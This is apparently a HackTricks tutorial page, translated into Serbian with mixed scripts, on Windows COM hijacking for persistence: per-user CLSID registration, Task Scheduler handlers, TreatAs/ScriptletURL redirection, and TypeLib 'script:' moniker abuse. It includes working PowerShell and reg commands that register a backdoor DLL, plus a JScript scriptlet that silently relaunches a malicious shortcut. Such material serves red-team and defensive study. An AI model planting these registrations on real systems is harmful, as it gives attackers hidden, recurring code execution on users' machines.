# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Pretraživanje nepostojećih COM komponenti

Pošto korisnici mogu menjati vrednosti u HKCU, **COM Hijacking** može biti korišćen kao **mehanizam perzistencije**. Korišćenjem `procmon` lako je pronaći tražene COM registracije koje još ne postoje i koje napadač može kreirati. Klasični filteri:

- **RegOpenKey** operacije.
- gde je _Result_ **NAME NOT FOUND**.
- i _Path_ se završava sa **InprocServer32**.

Korisne varijante tokom traženja:

- Pogledajte i za nedostajućim **`LocalServer32`** ključevima. Neke COM klase su serveri izvan procesa i pokrenuće EXE pod kontrolom napadača umesto DLL-a.
- Pretražite i za `TreatAs` i `ScriptletURL` registry operacijama pored `InprocServer32`. Sadržaji za detekciju i malware writeup-i često ih ističu jer su mnogo ređi od normalnih COM registracija i zato daju visok signal.
- Kopirajte legitimni `ThreadingModel` iz originalnog `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` kada klonirate registraciju u HKCU. Korišćenje pogrešnog modela često prekida aktivaciju i čini hijack bučnim.
- Na 64-bitnim sistemima proverite i 64-bitni i 32-bitni prikaz (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` i `HKLM\Software\Classes\WOW6432Node`) jer 32-bit aplikacije mogu rešavati drugačiju COM registraciju.

Kada odlučite koji nepostojeći COM ćete imitirati, izvršite sledeće komande. _Pažljivo ako odlučite da imitujete COM koji se učitava na svakih nekoliko sekundi, jer to može biti preterano._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks koriste Custom Triggers za pozivanje COM objekata i pošto se izvršavaju kroz Task Scheduler, lakše je predvideti kada će biti pokrenuti.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Pregledom izlaza možete izabrati onaj koji će se, na primer, izvršavati **svaki put kada se korisnik prijavi**.

Ako sada potražite CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** u **HKEY\CLASSES\ROOT\CLSID** i u HKLM i HKCU, obično ćete naći da vrednost ne postoji u HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Zatim, možete jednostavno kreirati HKCU unos i svaki put kada se korisnik prijavi, vaš backdoor će se pokrenuti.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` omogućava da jedan CLSID bude emuliran drugim. Iz ofanzivnog ugla, to znači da možete ostaviti originalni CLSID netaknut, kreirati drugi per-user CLSID koji pokazuje na `scrobj.dll`, i zatim preusmeriti stvarni COM objekat na maliciozni koristeći `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Ovo je korisno kada:

- ciljna aplikacija već instancira stabilan CLSID prilikom prijave ili pri pokretanju aplikacije
- želite preusmeravanje samo putem registra umesto zamene originalnog InprocServer32
- želite da izvršite lokalni ili udaljeni `.sct` scriptlet putem vrednosti `ScriptletURL`

Primer radnog toka (prilagođeno iz public Atomic Red Team tradecraft i starijih COM registry abuse research):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notes:

- `scrobj.dll` чита вредност `ScriptletURL` и извршава реферисани `.sct`, тако да payload можете држати као локални фајл или га повући удаљено преко HTTP/HTTPS.
- `TreatAs` је посебно користан када је оригинална COM регистрација комплетна и стабилна у HKLM, јер је довољно направити мало per-user преусмерење уместо да се огледа цео tree.
- За валидацију без чекања на природни тригер, можете ручно инстанцирати лажни ProgID/CLSID са `rundll32.exe -sta <ProgID-or-CLSID>` ако циљни class подржава STA активацију.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definišu COM интерфејсе и учитавају се преко `LoadTypeLib()`. Када се COM сервер инстанцира, OS такође може учитати повезани TypeLib консултујући registry кључеве под `HKCR\TypeLib\{LIBID}`. Ако је TypeLib путanja замењена са **moniker**, нпр. `script:C:\...\evil.sct`, Windows ће извршити scriptlet када се TypeLib разреши – што омогућава прикривену persistenciju која се активира када се додирну уобичајене компоненте.

Ово је запажено против Microsoft Web Browser control (често учитан од стране Internet Explorer, апликација које уграђују WebBrowser, па чак и `explorer.exe`).

### Steps (PowerShell)

1) Identifikujte TypeLib (LIBID) који користи high-frequency CLSID. Пример CLSID који често злоупотребљавају malware ланци: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Usmerite TypeLib putanju po korisniku na lokalni scriptlet koristeći moniker `script:` (nisu potrebna administratorska prava):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Drop minimalan JScript `.sct` koji ponovo pokreće vaš primarni payload (npr. `.lnk` koji se koristi u inicijalnom lancu):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Pokretanje – otvaranje IE, aplikacije koja ugrađuje WebBrowser control, ili čak rutinska aktivnost Explorera će učitati TypeLib i izvršiti scriptlet, ponovo aktivirajući vaš lanac pri prijavi/ponovnom pokretanju.

Čišćenje
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Napomene
- Istu logiku možete primeniti na druge često korišćene COM komponente; uvek prvo razrešite stvarni `LIBID` iz `HKCR\CLSID\{CLSID}\TypeLib`.
- Na 64-bitnim sistemima takođe možete popuniti podključ `win64` za 64-bitne aplikacije koje ga koriste.

## Izvori

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
